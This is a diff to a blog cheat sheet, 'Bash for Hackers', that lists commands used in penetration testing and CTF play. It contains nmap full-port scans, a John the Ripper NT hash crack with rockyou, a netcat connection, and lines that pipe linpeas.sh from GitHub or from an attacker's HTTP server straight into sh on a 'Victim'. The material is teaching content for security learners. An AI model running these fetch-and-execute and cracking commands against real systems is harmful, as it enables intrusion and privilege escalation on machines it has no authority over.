@@ -7,7 +7,7 @@ image: {
   alt: "Bash for Hackers",
 }
 description: Linux commands and shortcuts very often used by Hackers, Security professionals, CTF Players.
-draft: true
+draft: false
 category: Hacking 101
 ---
 
@@ -25,7 +25,10 @@ Linux commands that are often used by hackers, security professional and CTF pla
 ### Nmap
 
 ```bash
+#for TCP Scan
 sudo nmap -sC -sV -p- -T5 -Pn targethost
+
+#for UDP Scan
 sudo nmap -sU -sV -p- -T5 -Pn targethost
 ```
 
@@ -36,7 +39,7 @@ Start Metasploit with database
 Cracking hash with John
 
 ```bash
-──(abhinav㉿ETHICALHACKX)-[~]
+┌──(abhinav㉿ETHICALHACKX)-[~]
 └─$ john hash --format=NT --wordlist=/usr/share/wordlists/rockyou.txt 
 ```
 
@@ -103,11 +106,13 @@ nc IP port
 # From github
 curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
 
-Python Simple HTTP Server
+### Python Simple HTTP Server
 
 
+```bash
 python3 -m http.server 7777
 curl 10.10.10.10/linpeas.sh | sh #Victim
+```
 
 ### Wordpress CMS Vulnerabilty Scanning
 
